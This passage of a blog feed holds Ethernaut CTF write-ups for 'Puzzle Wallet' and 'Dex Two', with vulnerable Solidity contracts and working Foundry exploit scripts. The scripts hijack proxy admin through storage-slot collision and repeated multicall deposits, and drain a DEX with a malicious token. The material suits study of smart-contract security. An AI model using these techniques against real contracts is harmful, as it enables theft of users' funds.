class=\"kt\">bytes</span><span class=\"p\">[]</span> <span class=\"k\">memory</span> <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">bytes</span><span class=\"p\">[](</span><span class=\"mi\">2</span><span class=\"p\">);</span>        <span class=\"n\">data</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"deposit()\"</span><span class=\"p\">);</span>        <span class=\"n\">data</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"multicall(bytes[])\"</span><span class=\"p\">,</span> <span class=\"n\">data0</span><span class=\"p\">);</span>        <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">multicall</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">}(</span><span class=\"n\">data</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Exected multicall deposit x2\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After balance:        \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">pw_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After user balance:   \"</span><span class=\"p\">,</span> <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">balances</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"====================\"</span><span class=\"p\">);</span>        <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">execute</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"mf\">0.003</span> <span class=\"kc\">ether</span><span class=\"p\">,</span> <span class=\"s\">\"\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Exected execute to withdraw all\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After balance:        \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">pw_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After user balance:   \"</span><span class=\"p\">,</span> <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">balances</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"====================\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before maxBalance:    \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">maxBalance</span><span class=\"p\">())));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before admin:         \"</span><span class=\"p\">,</span> <span class=\"n\">pp_</span><span class=\"p\">.</span><span class=\"n\">admin</span><span class=\"p\">());</span>        <span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">setMaxBalance</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Exected setMaxBalance\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After  maxBalance:    \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">pw_</span><span class=\"p\">.</span><span class=\"n\">maxBalance</span><span class=\"p\">())));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After  admin:         \"</span><span class=\"p\">,</span> <span class=\"n\">pp_</span><span class=\"p\">.</span><span class=\"n\">admin</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>For convenience, they are distinguished as <code class=\"language-plaintext highlighter-rouge\">pp_</code> and <code class=\"language-plaintext highlighter-rouge\">pw_</code>.</p><p>Since the PuzzleWallet contract is called by the PuzzleProxy via <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code>, their storage is shared.Therefore, calling <code class=\"language-plaintext highlighter-rouge\">proposeNewAdmin(msg.sender)</code> updates <code class=\"language-plaintext highlighter-rouge\">pendingAdmin</code> to <code class=\"language-plaintext highlighter-rouge\">msg.sender</code>; however, since <code class=\"language-plaintext highlighter-rouge\">owner</code> occupies the same slot 0, it also changes to <code class=\"language-plaintext highlighter-rouge\">msg.sender</code>.Subsequently, you can call <code class=\"language-plaintext highlighter-rouge\">addToWhitelist(msg.sender)</code>, enabling you to pass the <code class=\"language-plaintext highlighter-rouge\">onlyWhitelisted</code> modifier.</p><p><code class=\"language-plaintext highlighter-rouge\">multicall()</code> has a vulnerability: although it is designed to allow <code class=\"language-plaintext highlighter-rouge\">deposit()</code> to be called only once, it is possible to call <code class=\"language-plaintext highlighter-rouge\">deposit()</code> multiple times by invoking a <code class=\"language-plaintext highlighter-rouge\">multicall()</code> that executes <code class=\"language-plaintext highlighter-rouge\">deposit()</code>.This allows <code class=\"language-plaintext highlighter-rouge\">deposit()</code> to be executed multiple times with a single Ether transfer, thereby manipulating <code class=\"language-plaintext highlighter-rouge\">balances[msg.sender]</code>.</p><p>By calling <code class=\"language-plaintext highlighter-rouge\">deposit()</code> multiple times to align <code class=\"language-plaintext highlighter-rouge\">address(this).balance</code> with <code class=\"language-plaintext highlighter-rouge\">balances[msg.sender]</code>, and then invoking <code class=\"language-plaintext highlighter-rouge\">execute()</code>, the condition <code class=\"language-plaintext highlighter-rouge\">address(this).balance == 0</code> can be satisfied, allowing the <code class=\"language-plaintext highlighter-rouge\">setMaxBalance()</code> function to be called.The <code class=\"language-plaintext highlighter-rouge\">setMaxBalance()</code> function updates <code class=\"language-plaintext highlighter-rouge\">maxBalance</code>; since <code class=\"language-plaintext highlighter-rouge\">admin</code> shares slot 1, its value is also modified, thereby achieving the goal.</p><p>The primary vulnerability lay in compromising integrity by invoking <code class=\"language-plaintext highlighter-rouge\">deposit()</code> multiple times within <code class=\"language-plaintext highlighter-rouge\">multicall()</code>. If the public variables <code class=\"language-plaintext highlighter-rouge\">pendingAdmin</code> and <code class=\"language-plaintext highlighter-rouge\">admin</code> had been stored in Implementation Slots, this goal would not have been achievable.</p>",
            "url": "https://0o3q.github.io/2026/01/09/puzzle-wallet",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","etherscan","EIP-1967","metadata","proxy","delegatecall"],
            
            "date_published": "2026-01-09T00:00:00+09:00",
            "date_modified": "2026-01-09T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2026/01/07/dex-two",
            "title": "[Ethernaut] 23.Dex Two",
            "summary": null,
            "content_text": "AnalysisThe goal is “drain all balances of token1 and token2 from the DexTwo contract”.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\";import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\";import \"openzeppelin-contracts-08/access/Ownable.sol\";contract DexTwo is Ownable {    address public token1;    address public token2;    constructor() {}    function setTokens(address _token1, address _token2) public onlyOwner {        token1 = _token1;        token2 = _token2;    }    function add_liquidity(address token_address, uint256 amount) public onlyOwner {        IERC20(token_address).transferFrom(msg.sender, address(this), amount);    }    function swap(address from, address to, uint256 amount) public {        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, \"Not enough to swap\");        uint256 swapAmount = getSwapAmount(from, to, amount);        IERC20(from).transferFrom(msg.sender, address(this), amount);        IERC20(to).approve(address(this), swapAmount);        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);    }    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));    }    function approve(address spender, uint256 amount) public {        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);    }    function balanceOf(address token, address account) public view returns (uint256) {        return IERC20(token).balanceOf(account);    }}contract SwappableTokenTwo is ERC20 {    address private _dex;    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)        ERC20(name, symbol)    {        _mint(msg.sender, initialSupply);        _dex = dexInstance;    }    function approve(address owner, address spender, uint256 amount) public {        require(owner != _dex, \"InvalidApprover\");        super._approve(owner, spender, amount);    }}Compared to the ‘Dex’ contract, the swap() function can use tokens other than token1 or token2 .Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/DexTwo.sol\";import \"forge-std/Script.sol\";import \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\";import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\";contract Token3 is ERC20 {    constructor() ERC20(\"Token3\", \"TK3\") {        _mint(msg.sender, 2);    }}contract DexTwoSol is Script {    DexTwo public dt_ = DexTwo(0x0e88F53DdCBCCF6375A81100d0Bec91876FC8e3c);    function run() external {        vm.startBroadcast();        Token3 token3 = new Token3();        IERC20(token3).transfer(address(dt_), 1);        dt_.approve(address(dt_), 100);        IERC20(token3).approve(address(dt_), 1);                dt_.swap(dt_.token1(), dt_.token2(), 10);        dt_.swap(dt_.token2(), dt_.token1(), 20);        dt_.swap(dt_.token1(), dt_.token2(), 24);        dt_.swap(dt_.token2(), dt_.token1(), 30);        dt_.swap(dt_.token1(), dt_.token2(), 41);        dt_.swap(dt_.token2(), dt_.token1(), 45);        dt_.swap(address(token3), dt_.token2(), 1);        console.log(\"My token1 balance:\", dt_.balanceOf(dt_.token1(), msg.sender));        console.log(\"My token2 balance:\", dt_.balanceOf(dt_.token2(), msg.sender));        console.log(\"My token3 balance:\", IERC20(token3).balanceOf(msg.sender));        console.log(\"Dex's token1 balance:\", dt_.balanceOf(dt_.token1(), address(dt_)));        console.log(\"Dex's token2 balance:\", dt_.balanceOf(dt_.token2(), address(dt_)));        console.log(\"Dex's token3 balance:\", IERC20(token3).balanceOf(address(dt_)));        vm.stopBroadcast();    }}We deploy a malicious token (token3) and swap it for token2.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/DexTwo.sol\";import \"forge-std/Script.sol\";import \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\";import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\";contract Token3 is ERC20 {    DexTwo public dt_ = DexTwo(0x0e88F53DdCBCCF6375A81100d0Bec91876FC8e3c);    constructor() ERC20(\"Token3\", \"TK3\") {        _mint(msg.sender, 2);        _mint(address(dt_), 1);    }    function burn(address account, uint256 amount) public {        _burn(account, amount);    }}contract DexTwoSol is Script {    DexTwo public dt_ = DexTwo(0x0e88F53DdCBCCF6375A81100d0Bec91876FC8e3c);    function run() external {        vm.startBroadcast();        Token3 token3 = new Token3();        IERC20(token3).approve(address(dt_), 2);        dt_.swap(address(token3), dt_.token1(), 1);        token3.burn(address(dt_), 1);        dt_.swap(address(token3), dt_.token2(), 1);        console.log(\"My token1 balance:\", dt_.balanceOf(dt_.token1(), msg.sender));        console.log(\"My token2 balance:\", dt_.balanceOf(dt_.token2(), msg.sender));        console.log(\"My token3 balance:\", IERC20(token3).balanceOf(msg.sender));        console.log(\"Dex's token1 balance:\", dt_.balanceOf(dt_.token1(), address(dt_)));        console.log(\"Dex's token2 balance:\", dt_.balanceOf(dt_.token2(), address(dt_)));        console.log(\"Dex's token3 balance:\", IERC20(token3).balanceOf(address(dt_)));        vm.stopBroadcast();    }}We can also achieve the goal by exploiting precision loss through fewer swap.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is “drain all balances of token1 and token2 from the <code class=\"language-plaintext highlighter-rouge\">DexTwo</code> contract”.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/IERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/ERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/access/Ownable.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">DexTwo</span> <span class=\"k\">is</span> <span class=\"n\">Ownable</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">token1</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">token2</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{}</span>    <span class=\"k\">function</span> <span class=\"n\">setTokens</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_token1</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_token2</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">token1</span> <span class=\"o\">=</span> <span class=\"n\">_token1</span><span class=\"p\">;</span>        <span class=\"n\">token2</span> <span class=\"o\">=</span> <span class=\"n\">_token2</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">add_liquidity</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">token_address</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token_address</span><span class=\"p\">).</span><span class=\"n\">transferFrom</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">amount</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)</span> <span class=\"o\">&gt;=</span> <span class=\"n\">amount</span><span class=\"p\">,</span> <span class=\"s\">\"Not enough to swap\"</span><span class=\"p\">);</span>        <span class=\"kt\">uint256</span> <span class=\"n\">swapAmount</span> <span class=\"o\">=</span> <span class=\"n\">getSwapAmount</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">).</span><span class=\"n\">transferFrom</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">amount</span><span class=\"p\">);</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">).</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">swapAmount</span><span class=\"p\">);</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">).</span><span class=\"n\">transferFrom</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">swapAmount</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getSwapAmount</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"p\">((</span><span class=\"n\">amount</span> <span class=\"o\">*</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">)))</span> <span class=\"o\">/</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">)));</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">SwappableTokenTwo</span><span class=\"p\">(</span><span class=\"n\">token1</span><span class=\"p\">).</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>        <span class=\"n\">SwappableTokenTwo</span><span class=\"p\">(</span><span class=\"n\">token2</span><span class=\"p\">).</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">token</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">account</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">account</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">SwappableTokenTwo</span> <span class=\"k\">is</span> <span class=\"n\">ERC20</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">private</span> <span class=\"n\">_dex</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">dexInstance</span><span class=\"p\">,</span> <span class=\"kt\">string</span> <span class=\"k\">memory</span> <span class=\"n\">name</span><span class=\"p\">,</span> <span class=\"kt\">string</span> <span class=\"k\">memory</span> <span class=\"n\">symbol</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">initialSupply</span><span class=\"p\">)</span>        <span class=\"n\">ERC20</span><span class=\"p\">(</span><span class=\"n\">name</span><span class=\"p\">,</span> <span class=\"n\">symbol</span><span class=\"p\">)</span>    <span class=\"p\">{</span>        <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">initialSupply</span><span class=\"p\">);</span>        <span class=\"n\">_dex</span> <span class=\"o\">=</span> <span class=\"n\">dexInstance</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">owner</span> <span class=\"o\">!=</span> <span class=\"n\">_dex</span><span class=\"p\">,</span> <span class=\"s\">\"InvalidApprover\"</span><span class=\"p\">);</span>        <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"n\">_approve</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Compared to the ‘Dex’ contract, the <code class=\"language-plaintext highlighter-rouge\">swap()</code> function can use tokens other than <code class=\"language-plaintext highlighter-rouge\">token1</code> or <code class=\"language-plaintext highlighter-rouge\">token2</code> .</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/DexTwo.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/IERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/ERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Token3</span> <span class=\"k\">is</span> <span class=\"n\">ERC20</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"n\">ERC20</span><span class=\"p\">(</span><span class=\"s\">\"Token3\"</span><span class=\"p\">,</span> <span class=\"s\">\"TK3\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">DexTwoSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">DexTwo</span> <span class=\"k\">public</span> <span class=\"n\">dt_</span> <span class=\"o\">=</span> <span class=\"n\">DexTwo</span><span class=\"p\">(</span><span class=\"mh\">0x0e88F53DdCBCCF6375A81100d0Bec91876FC8e3c</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">Token3</span> <span class=\"n\">token3</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Token3</span><span class=\"p\">();</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token3</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">),</span> <span class=\"mi\">1</span><span class=\"p\">);</span>        <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">),</span> <span class=\"mi\">100</span><span class=\"p\">);</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token3</span><span class=\"p\">).</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">),</span> <span class=\"mi\">1</span><span class=\"p\">);</span>                <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"mi\">10</span><span class=\"p\">);</span>        <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"mi\">20</span><span class=\"p\">);</span>        <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"mi\">24</span><span class=\"p\">);</span>        <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"mi\">30</span><span class=\"p\">);</span>        <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"mi\">41</span><span class=\"p\">);</span>        <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"mi\">45</span><span class=\"p\">);</span>        <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">token3</span><span class=\"p\">),</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"mi\">1</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My token1 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span 